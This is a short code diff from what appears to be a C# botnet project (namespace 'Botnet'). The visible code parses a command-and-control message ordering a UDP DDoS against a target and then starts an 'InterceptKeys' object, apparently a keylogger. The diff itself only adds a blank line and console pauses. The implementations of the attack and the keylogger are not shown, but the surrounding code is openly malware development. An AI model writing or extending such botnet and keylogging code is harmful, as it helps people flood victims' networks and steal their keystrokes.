@@ -27,11 +27,13 @@ namespace Botnet
             ProtocolController ptclctl = new ProtocolController("<SOC><CMD>DDOS</CMD><TARGET>127.0.0.1</TARGET><ARG1>UDP</ARG1><ARG2>1500</ARG2><EOC>");
             Console.WriteLine("Action: " + ptclctl.action + "\n");
             Console.WriteLine("Target: " + ptclctl.target + "\n");
+            
             foreach (string str in ptclctl.arguments)
             {
                 Console.WriteLine(str);
             }
-
+            Console.Read();
+            Console.ReadKey();
             InterceptKeys interceptor = new InterceptKeys();
             interceptor.start();
             
